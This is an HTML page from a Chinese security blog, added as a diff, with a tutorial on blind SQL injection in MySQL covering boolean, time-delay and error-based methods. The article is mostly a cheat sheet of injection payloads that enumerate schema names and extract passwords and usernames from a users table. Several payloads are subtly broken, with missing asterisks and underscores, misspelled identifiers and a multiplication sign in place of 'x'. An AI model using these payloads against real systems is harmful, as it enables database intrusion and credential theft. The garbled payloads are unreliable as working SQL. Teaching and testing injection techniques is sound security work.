@@ -1,0 +1,606 @@
+<!DOCTYPE html>
+<html>
+<head><meta name="generator" content="Hexo 3.9.0">
+    <meta charset="utf-8">
+    
+    
+    <title>SQL注入之盲注 | To be better</title>
+    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+    
+    <meta name="keywords" content="SQL注入">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3.5.2/dist/jquery.fancybox.min.css">
+    <link rel="stylesheet" href="/css/style.css?v=1.4.2">
+    
+    <script type="text/javascript">
+        // Data Center
+        var DC = {
+            reward:	true,
+            lv: JSON.parse('{"enable":false,"app_id":null,"app_key":null,"icon":true}'),
+            v: JSON.parse('{"enable":false,"appid":null,"appkey":null,"notify":true,"verify":true,"placeholder":"give me some sugers plz...","avatar":"wavatar"}'),
+            g: JSON.parse('{"enable":false,"lazy":true,"owner":"codefine","repo":"gitment","oauth":{"client_id":null,"client_secret":null},"perPage":10}'),
+            d: JSON.parse('{"app_id":null}')
+        };
+    </script>
+    <script type="text/javascript">
+        window.lazyScripts=[];
+    </script>
+    
+</head>
+
+
+<body>
+    <div id="loading" class="active"></div>
+
+    <aside id="menu" class="">
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap">
+      
+      <img src="/img/brand.jpg" class="brand-bg">
+      
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/avatar.jpg">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname">Wisejay</h5>
+          <a href="mailto:1418084893@qq.com" title="1418084893@qq.com" class="mail">
+            
+              <span>1</span>
+            
+              <span>4</span>
+            
+              <span>1</span>
+            
+              <span>8</span>
+            
+              <span>0</span>
+            
+              <span>8</span>
+            
+              <span>4</span>
+            
+              <span>8</span>
+            
+              <span>9</span>
+            
+              <span>3</span>
+            
+              <span>@</span>
+            
+              <span>q</span>
+            
+              <span>q</span>
+            
+              <span>.</span>
+            
+              <span>c</span>
+            
+              <span>o</span>
+            
+              <span>m</span>
+            
+          </a>
+        </hgroup>
+        
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+            <li class="">
+              <a href="/"  >
+                <i class="icon icon-lg icon-home"></i>
+                首页
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/categories"  >
+                <i class="icon icon-lg icon-th-list"></i>
+                分类
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/tags"  >
+                <i class="icon icon-lg icon-tags"></i>
+                标签
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/archives"  >
+                <i class="icon icon-lg icon-archives"></i>
+                归档
+              </a>
+            </li>
+        
+            <li class="">
+              <a href="/about"  >
+                <i class="icon icon-lg icon-user"></i>
+                关于
+              </a>
+            </li>
+        
+      </ul>
+    </div>
+  </div>
+</aside>
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row clearfix">
+        <a href="javascript:;" class="header-icon pull-left waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">
+            <span>SQL注入之盲注</span>
+            
+        </div>
+        
+        <a href="javascript:;" id="site_search_btn" class="header-icon pull-right waves-effect waves-circle waves-light">
+            <i class="icon icon-lg icon-search"></i>
+        </a>
+        
+    </div>
+</header>
+<header class="content-header post-header">
+    <img src="/img/banner.jpg" class="header-bg">
+    <div class="container fade-scale">
+        <h1 class="title">SQL注入之盲注</h1>
+        <h5 class="subtitle">
+            
+                <time datetime="2019-08-19T02:28:29.000Z" itemprop="datePublished" class="page-time">
+  2019-08-19
+</time>
+
+
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/安全/">安全</a></li></ul>
+
+            
+        </h5>
+        
+    </div>
+    
+
+</header>
+
+<div id="site_search">
+    <div class="search-title clearfix">
+        <span class="pull-left">
+          <i class="icon icon-lg icon-search"></i>
+        </span>
+        <input type="text" id="local-search-input" name="q" results="0" placeholder="search my blog..." class="form-control pull-left"/>
+        <a href="javascript:;" class="close pull-right waves-effect waves-circle waves-light">
+          <i class="icon icon-lg icon-close"></i>
+        </a>
+    </div>
+    <div id="local-search-result"></div>
+</div>
+
+
+<div class="container body-wrap">
+    <article id="post-SQL注入之盲注"
+  class="post-article article-type-post" itemprop="blogPost">
+    <div class="post-card">
+        <h1 class="post-card-title">SQL注入之盲注</h1>
+        <div class="post-meta">
+            <time class="post-time" title="2019-08-19 10:28:29" datetime="2019-08-19T02:28:29.000Z"  itemprop="datePublished">2019-08-19</time>
+
+            
+	<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/安全/">安全</a></li></ul>
+
+
+
+            
+
+            
+
+
+            
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            
+            <h1 id="盲注"><a href="#盲注" class="headerlink" title="盲注"></a>盲注</h1><p><code>sql注入的一种，之所以被称为盲注，因为它不会根据你插入的恶意的sql注入语句来 返回你所需要的信息。</code></p>
+<h1 id="盲注分类"><a href="#盲注分类" class="headerlink" title="盲注分类"></a>盲注分类</h1><ol>
+<li><p>布尔盲注</p>
+</li>
+<li><p>时间盲注</p>
+</li>
+<li><p>报错盲注</p>
+</li>
+</ol>
+<h1 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h1><h2 id="布尔注入原理"><a href="#布尔注入原理" class="headerlink" title="布尔注入原理"></a>布尔注入原理</h2><p>布尔盲注时，也就相当于”逻辑”注入。我们在注入的过程，页面呈现给我们的就是一个布尔值：true/flase.我们可以跟住这个布尔值来进行有效判断。 如果是ture则返回网站正常页面，如果是是fales则返回一个错误页面，且页面上不会出现任何错误信息。</p>
+<h2 id="布尔注入常用函数"><a href="#布尔注入常用函数" class="headerlink" title="布尔注入常用函数"></a>布尔注入常用函数</h2><h3 id="Left函数（s，n）"><a href="#Left函数（s，n）" class="headerlink" title="Left函数（s，n）"></a>Left函数（s，n）</h3><p>返回字符串s左边第n个值</p>
+<h3 id="length-函数"><a href="#length-函数" class="headerlink" title="length()函数"></a>length()函数</h3><p>返回字符串的长度</p>
+<h3 id="substr-函数"><a href="#substr-函数" class="headerlink" title="substr()函数"></a>substr()函数</h3><p>substr(string,start,length);</p>
+<p>string为字符串；</p>
+<p>start为字符串起始截取位置；</p>
+<p>length为字符串长度;</p>
+<h3 id="ascii-函数"><a href="#ascii-函数" class="headerlink" title="ascii()函数"></a>ascii()函数</h3><p>将字符串中最左边字符转换为相对应的ASCII代码值。</p>
+<h3 id="regxp-函数"><a href="#regxp-函数" class="headerlink" title="regxp()函数"></a>regxp()函数</h3><p>正则表达式配对</p>
+<h2 id="布尔使用方法"><a href="#布尔使用方法" class="headerlink" title="布尔使用方法"></a>布尔使用方法</h2><p>对于布尔注入使用方法，我们常常使用的是为二分法。假设数据是按升序排序的，对于给定值 x，从序列的中间位置开始比较，如果当前位置值等于 x，则查找成功；若 x 小于当前位置值，则在数列的前半段中选择中间的再次查找；若 x 大于当前位置值则在数列的后半段中选择中间的数继续查找， 直到找到为止。</p>
+<h3 id="猜数据库长度"><a href="#猜数据库长度" class="headerlink" title="猜数据库长度"></a>猜数据库长度</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (length(database()))&lt;10--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="爆数据库"><a href="#爆数据库" class="headerlink" title="爆数据库"></a>爆数据库</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr(database(),1,1)))&gt;100--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="猜测表名"><a href="#猜测表名" class="headerlink" title="猜测表名"></a>猜测表名</h3><p>长度：</p>
+<figure class="highlight plain"><figcaption><span>table_name from</span></figcaption><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">information_schema.tables where table_schema=database() limit 0,1)))&lt;10--+</span><br></pre></td></tr></table></figure>
+
+<p>内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1)))&lt;116--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="猜列名"><a href="#猜列名" class="headerlink" title="猜列名"></a>猜列名</h3><p>长度：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (length((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1)))&gt;10 --+</span><br></pre></td></tr></table></figure>
+
+<p>内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr((select column_name from information_schema.columns where table_name=&apos;users&apos; limit 0,1),1,1)))&gt;100 --+</span><br></pre></td></tr></table></figure>
+
+<h3 id="猜数据"><a href="#猜数据" class="headerlink" title="猜数据"></a>猜数据</h3><p>密码长度:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (length(( select password from users limit 0,1)))=6--+</span><br></pre></td></tr></table></figure>
+
+<p>密码内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (ascii(substr(( select password from users limit 0,1),1,1)))=68--+</span><br></pre></td></tr></table></figure>
+
+<p>账号同理将password换成user。</p>
+<h1 id="时间注入"><a href="#时间注入" class="headerlink" title="时间注入"></a>时间注入</h1><h2 id="时间注入原理"><a href="#时间注入原理" class="headerlink" title="时间注入原理"></a>时间注入原理</h2><p>通过sleep函数进行sql注入，查看页面返回信息速度是否明显延迟了对应的时间秒数。通过页面的延迟时间来判<br>断是否注入成功。但需要注意的是，时间注入返回的页面信息一样是没有回显错误的页面，我们只是根据页面延迟时间来进行猜测判断。</p>
+<h2 id="时间注入函数"><a href="#时间注入函数" class="headerlink" title="时间注入函数"></a>时间注入函数</h2><h3 id="sleep-函数"><a href="#sleep-函数" class="headerlink" title="sleep()函数"></a>sleep()函数</h3><p>sleep(n)函数可以让数据库执行语句”停留”n秒时间，成功执行会返回0。而如果执行过程中断，会返回1。<br>sleep()函数可以让函数停留n秒时间，然后 返回０。如果程序被打断,则返回1。</p>
+<h3 id="if-函数"><a href="#if-函数" class="headerlink" title="if()函数"></a>if()函数</h3><p>if(表达式1,表达式2,表达式3)</p>
+<p>当表达式１是true，则会返回表达式２；否则返回表达式３。</p>
+<h2 id="时间盲注使用方法"><a href="#时间盲注使用方法" class="headerlink" title="时间盲注使用方法"></a>时间盲注使用方法</h2><h3 id="判断注入点"><a href="#判断注入点" class="headerlink" title="判断注入点"></a>判断注入点</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(1=0,1, sleep(5))--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="猜数据库名"><a href="#猜数据库名" class="headerlink" title="猜数据库名"></a>猜数据库名</h3><p>长度：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(length(database())=8,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>内容:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and If(ascii(substr(database(),1,1))=115,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="猜表名"><a href="#猜表名" class="headerlink" title="猜表名"></a>猜表名</h3><p>长度:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(length((select tablen_ame from information_schema.tables where table_schema=&apos;security&apos; limit 1,1))=5,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">And If(ascii(substr((select tablen_ame from information_schema.tables where table_schema=&apos;security&apos; limit 1,1),1,1))=117,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="猜列名-1"><a href="#猜列名-1" class="headerlink" title="猜列名"></a>猜列名</h3><p>长度:</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(length((select column_name from information_schema.columns where table_schema=&apos;security&apos; and table_name=&apos;flag&apos; limit 1,1))=４,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<p>内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(ascii(substr((select columnname from informationschema.columns where tableschema=&apos;security&apos; and tablename=&apos;flag&apos; limit 1,1),1,1))=117,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<h3 id="猜字段"><a href="#猜字段" class="headerlink" title="猜字段"></a>猜字段</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and if(length((select flag from security.flag limit 0,1))=4,sleep(5),1)--+</span><br></pre></td></tr></table></figure>
+
+<h1 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h1><h2 id="报错注入原理"><a href="#报错注入原理" class="headerlink" title="报错注入原理"></a>报错注入原理</h2><p>一般都是基于数据库某些函数特性 函数特性和数据库本身的特性 数据库本身的特性来返回错误信息，从而获取到我们想要的数据库信息，从而实现我们sql注入的目的。</p>
+<h2 id="报错注入函数"><a href="#报错注入函数" class="headerlink" title="报错注入函数"></a>报错注入函数</h2><h3 id="floor函数-取整"><a href="#floor函数-取整" class="headerlink" title="floor函数(取整)"></a>floor函数(取整)</h3><p>sql注入的floor语句公式：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and (select 1 from(select count(),concat(version(),floor(rand(0)2))x from information_schema.tables group by x)a)</span><br></pre></td></tr></table></figure>
+
+<h3 id="exp-函数"><a href="#exp-函数" class="headerlink" title="exp()函数"></a>exp()函数</h3><p>用于计算e的x次方的函数。</p>
+<blockquote>
+<p>exp函数特性：在mysql数据库中，exp()只能计算710之内的数值，一旦超过或者等于710的话，则会进行整形报错溢出。提示：DOUBLE value is out of<br>range in ‘exp(710)’ double类型超出了exp(710)范围。</p>
+</blockquote>
+<blockquote>
+<p>如果构造利用为~0的话，它是代表着按0按位取反就会返回“18446744073709551615”，得到最大的无符号BIGINT值。</p>
+</blockquote>
+<p><code>利用环境：mysql&gt;5.5.5
+利用上述exp和~特性，我们可以构造成payload:and (EXP(~(select * from(select version())a)));</code></p>
+<h3 id="数据重复报错"><a href="#数据重复报错" class="headerlink" title="数据重复报错"></a>数据重复报错</h3><p>利用环境：mysql低版本</p>
+<pre><code>payload：select * from (select NAME_CONST(version(),1),NAME_CONST(version(),1))x</code></pre><p>利用了数据库无法识别重复查询数据库版本信息的操作，从而进行报错。</p>
+<h3 id="Xpath报错"><a href="#Xpath报错" class="headerlink" title="Xpath报错"></a>Xpath报错</h3><p>数据库环境:mysql 5.1.5</p>
+<h4 id="updataxml-函数"><a href="#updataxml-函数" class="headerlink" title="updataxml()函数"></a>updataxml()函数</h4><p>UPDATEXML (XMLdocument, XPathstring, new_value);</p>
+<p>第一个参数：XML_document是String格式，为XML文档对象的名称，文中为Doc</p>
+<p>第二个参数：XPath_string (Xpath格式的字符串)</p>
+<p>第三个参数：new_value，String格式，替换查找到的符合条件的数据</p>
+<p>作用：改变文档中符合条件的节点的值（其实简单的说，就是对xml进行查询和修改）</p>
+<h4 id="extractvalue-函数"><a href="#extractvalue-函数" class="headerlink" title="extractvalue()函数"></a>extractvalue()函数</h4><p>extractvalue(目标xml文档，xml路径)</p>
+<p><code>作用:对xml进行查修和修改。</code></p>
+<pre><code>payload: and updatexml(1,concat(0x7e,(SELECT @@version),0x7e),1)
+payload: and updatexml(1,concat(0x7e,(SELECT version()),0x7e),1)
+payload：and (extractvalue(1,concat(0×7e,(version()),0×7e)));</code></pre><p>在这里我们先是查询了数据库的版本信息，而后concat函数进行连接字符串信息，然后利用xml语法进行查询和修改。但是我们却使用 0x7e进行拼接，0x7e是啥？这是特殊字符~进行十六进制转换的结果。同时updataxml函数是第二位置是拼接xml字符串，而extractvalue是需要xml路 径。至于xml具体语法我就不讲解了，这里0x7e嵌套在里面的话，xml语法是无法识别的，所以会进行报错，从而产生了报错得到我们想要的信息。</p>
+<h1 id="其他盲注报错注入函数利用："><a href="#其他盲注报错注入函数利用：" class="headerlink" title="其他盲注报错注入函数利用："></a>其他盲注报错注入函数利用：</h1><p>GeometryCollection()</p>
+<p>id = 1 AND GeometryCollection((select * from (select * from(select user())a)b))</p>
+<p>polygon()</p>
+<p>id =1 AND polygon((select * from(select * from(select user())a)b))</p>
+<p>multipoint()</p>
+<p>id = 1 AND multipoint((select * from(select * from(select user())a)b))</p>
+<p>multilinestring()</p>
+<p>id = 1 AND multilinestring((select * from(select * from(select user())a)b))</p>
+<p>linestring()</p>
+<p>id = 1 AND LINESTRING((select * from(select * from(select user())a)b))</p>
+<p>multipolygon()</p>
+<p>id =1 AND multipolygon((select * from(select * from(select user())a)b))</p>
+
+        </div>
+        
+<blockquote class="post-copyright">
+    <div class="content">
+        
+<span class="post-time">
+    Last updated: <time datetime="2019-08-19T02:45:45.378Z" itemprop="dateUpdated">2019-08-19 10:45:45</time>
+</span><br>
+
+
+        
+        转载注明出处，原文地址：<a href="/2019/08/19/SQL注入之盲注/" target="_blank" rel="external">http://wisejay.top/2019/08/19/SQL注入之盲注/</a>
+        
+    </div>
+    <footer>
+        <a href="http://wisejay.top">
+            <img src="/img/avatar.jpg" alt="Wisejay">
+            Wisejay
+        </a>
+    </footer>
+</blockquote>
+
+        
+            <div class="page-reward">
+    <a id="rewardBtn" href="javascript:;" class="page-reward-btn waves-effect waves-circle waves-light">赏</a>
+</div>
+
+            
+        
+        <div class="post-footer">
+            
+	<ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/SQL注入/">SQL注入</a></li></ul>
+
+            <div class="page-share-wrap">
+    
+
+<div class="page-share" id="pageShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.top/2019/08/19/SQL注入之盲注/&title=《SQL注入之盲注》 — To be better&pic=http://wisejay.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.top/2019/08/19/SQL注入之盲注/&title=《SQL注入之盲注》 — To be better&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+
+    <a href="javascript:;" id="shareFab" class="page-share-fab waves-effect waves-circle">
+        <i class="icon icon-share-alt icon-lg"></i>
+    </a>
+</div>
+
+        </div>
+        
+            
+
+
+        
+    </div>
+    
+<nav class="post-nav flex-row flex-justify-between flex-row-reverse">
+  
+
+  
+    <div class="next">
+      <a href="/2019/08/17/SQL注入之cookie和user-agent注入/" id="post-next" class="post-nav-link">
+        <div class="tips">Next <i class="icon icon-angle-right icon-lg icon-pl"></i></div>
+        <h4 class="title">SQL注入之cookie和user-agent注入</h4>
+      </a>
+    </div>
+  
+</nav>
+
+
+    
+    
+        <aside class="post-widget">
+            <nav class="post-toc-wrap" id="post-toc">
+                <strong>目录</strong>
+                <ol class="post-toc"><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#盲注"><span class="post-toc-number">1.</span> <span class="post-toc-text">盲注</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#盲注分类"><span class="post-toc-number">2.</span> <span class="post-toc-text">盲注分类</span></a></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#布尔盲注"><span class="post-toc-number">3.</span> <span class="post-toc-text">布尔盲注</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#布尔注入原理"><span class="post-toc-number">3.1.</span> <span class="post-toc-text">布尔注入原理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#布尔注入常用函数"><span class="post-toc-number">3.2.</span> <span class="post-toc-text">布尔注入常用函数</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Left函数（s，n）"><span class="post-toc-number">3.2.1.</span> <span class="post-toc-text">Left函数（s，n）</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#length-函数"><span class="post-toc-number">3.2.2.</span> <span class="post-toc-text">length()函数</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#substr-函数"><span class="post-toc-number">3.2.3.</span> <span class="post-toc-text">substr()函数</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#ascii-函数"><span class="post-toc-number">3.2.4.</span> <span class="post-toc-text">ascii()函数</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#regxp-函数"><span class="post-toc-number">3.2.5.</span> <span class="post-toc-text">regxp()函数</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#布尔使用方法"><span class="post-toc-number">3.3.</span> <span class="post-toc-text">布尔使用方法</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#猜数据库长度"><span class="post-toc-number">3.3.1.</span> <span class="post-toc-text">猜数据库长度</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#爆数据库"><span class="post-toc-number">3.3.2.</span> <span class="post-toc-text">爆数据库</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#猜测表名"><span class="post-toc-number">3.3.3.</span> <span class="post-toc-text">猜测表名</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#猜列名"><span class="post-toc-number">3.3.4.</span> <span class="post-toc-text">猜列名</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#猜数据"><span class="post-toc-number">3.3.5.</span> <span class="post-toc-text">猜数据</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#时间注入"><span class="post-toc-number">4.</span> <span class="post-toc-text">时间注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#时间注入原理"><span class="post-toc-number">4.1.</span> <span class="post-toc-text">时间注入原理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#时间注入函数"><span class="post-toc-number">4.2.</span> <span class="post-toc-text">时间注入函数</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#sleep-函数"><span class="post-toc-number">4.2.1.</span> <span class="post-toc-text">sleep()函数</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#if-函数"><span class="post-toc-number">4.2.2.</span> <span class="post-toc-text">if()函数</span></a></li></ol></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#时间盲注使用方法"><span class="post-toc-number">4.3.</span> <span class="post-toc-text">时间盲注使用方法</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#判断注入点"><span class="post-toc-number">4.3.1.</span> <span class="post-toc-text">判断注入点</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#猜数据库名"><span class="post-toc-number">4.3.2.</span> <span class="post-toc-text">猜数据库名</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#猜表名"><span class="post-toc-number">4.3.3.</span> <span class="post-toc-text">猜表名</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#猜列名-1"><span class="post-toc-number">4.3.4.</span> <span class="post-toc-text">猜列名</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#猜字段"><span class="post-toc-number">4.3.5.</span> <span class="post-toc-text">猜字段</span></a></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#报错注入"><span class="post-toc-number">5.</span> <span class="post-toc-text">报错注入</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#报错注入原理"><span class="post-toc-number">5.1.</span> <span class="post-toc-text">报错注入原理</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#报错注入函数"><span class="post-toc-number">5.2.</span> <span class="post-toc-text">报错注入函数</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#floor函数-取整"><span class="post-toc-number">5.2.1.</span> <span class="post-toc-text">floor函数(取整)</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#exp-函数"><span class="post-toc-number">5.2.2.</span> <span class="post-toc-text">exp()函数</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#数据重复报错"><span class="post-toc-number">5.2.3.</span> <span class="post-toc-text">数据重复报错</span></a></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#Xpath报错"><span class="post-toc-number">5.2.4.</span> <span class="post-toc-text">Xpath报错</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#updataxml-函数"><span class="post-toc-number">5.2.4.1.</span> <span class="post-toc-text">updataxml()函数</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#extractvalue-函数"><span class="post-toc-number">5.2.4.2.</span> <span class="post-toc-text">extractvalue()函数</span></a></li></ol></li></ol></li></ol></li><li class="post-toc-item post-toc-level-1"><a class="post-toc-link" href="#其他盲注报错注入函数利用："><span class="post-toc-number">6.</span> <span class="post-toc-text">其他盲注报错注入函数利用：</span></a></li></ol>
+            </nav>
+            <div class="toc-bar"><div>
+        </aside>
+    
+</article>
+
+    <div id="reward" class="page-modal reward-lay">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <h3 class="reward-title">
+        <i class="icon icon-quote-left"></i>
+        我们一起来让这个世界有趣一点
+        <i class="icon icon-quote-right"></i>
+    </h3>
+    <div class="reward-content">
+        
+        <div class="reward-code">
+            <img id="rewardCode" src="/img/reward-wechat.jpg" alt="打赏二维码">
+        </div>
+        
+        <label class="reward-toggle">
+            <input id="rewardToggle" type="checkbox" class="reward-toggle-check"
+                data-wechat="/img/reward-wechat.jpg" data-alipay="/img/reward-alipay.jpg">
+            <div class="reward-toggle-ctrol">
+                <span class="reward-toggle-item wechat">微信</span>
+                <span class="reward-toggle-label"></span>
+                <span class="reward-toggle-item alipay">支付宝</span>
+            </div>
+        </label>
+        
+    </div>
+</div>
+
+    
+
+</div>
+
+    </main>
+    <footer class="footer ">
+    
+    <div class="bottom">
+        <p>
+            <span>
+                Wisejay &copy; 2019
+            </span>
+        		
+           	
+            
+            
+            
+            
+
+            
+                
+<span class="site-uv" title="总访客量">
+    <i class="icon icon-user"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_uv"></i>
+</span>
+
+
+<span class="site-pv" title="总访问量">
+    <i class="icon icon-eye"></i>
+    <i class="busuanzi-value" id="busuanzi_value_site_pv"></i>
+</span>
+
+            
+        </p>
+    </div>
+</footer>
+
+    <div class="mask" id="mask"></div>
+<a href="javascript:;" id="gotop" class="waves-effect waves-circle waves-light"><span class="icon icon-lg icon-chevron-up"></span></a>
+
+
+
+<div class="global-share" id="globalShare">
+    <ul class="reset share-icons">
+      
+      <li>
+        <a class="weibo share-sns" target="_blank" href="http://service.weibo.com/share/share.php?url=http://wisejay.top/2019/08/19/SQL注入之盲注/&title=《SQL注入之盲注》 — To be better&pic=http://wisejay.top/img/avatar.jpg" data-title="微博">
+          <i class="icon icon-weibo"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="weixin share-sns wxFab" href="javascript:;" data-title="微信">
+          <i class="icon icon-weixin"></i>
+        </a>
+      </li>
+      
+      <li>
+        <a class="qq share-sns" target="_blank" href="http://connect.qq.com/widget/shareqq/index.html?url=http://wisejay.top/2019/08/19/SQL注入之盲注/&title=《SQL注入之盲注》 — To be better&source=" data-title=" QQ">
+          <i class="icon icon-qq"></i>
+        </a>
+      </li>
+      
+    </ul>
+ </div>
+
+
+<div class="page-modal wx-share" id="wxShare">
+    <a class="close" href="javascript:;"><i class="icon icon-close"></i></a>
+    <p>扫一扫，分享到微信</p>
